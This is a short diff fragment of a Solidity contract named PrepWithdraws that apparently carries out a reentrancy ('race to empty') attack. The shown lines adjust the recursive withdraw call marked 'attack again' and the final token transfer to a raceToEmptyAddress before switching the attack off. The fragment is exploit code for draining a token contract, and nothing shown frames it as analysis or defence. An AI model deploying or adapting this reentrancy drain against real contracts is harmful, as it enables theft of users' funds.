@@ -58,10 +58,10 @@ contract PrepWithdraws {
       depth = depth + 1;
       Log("value:", (uint)(this.balance/conversion));
       if (depth < numExtraWithdraws) {  /* attack again */
-        twi.withdraw();
+        twi.withdraw.value(tokensInWei)();
       } else {
         Log("Transferring tokens", numTokens);
-        twi.transfer.value(numExtraWithdraws*tokensInWei)(raceToEmptyAddress,numTokens);
+        twi.transfer.value(tokensInWei)(raceToEmptyAddress,numTokens);
         performAttack = false; /* turn off attack again*/
       }
     }
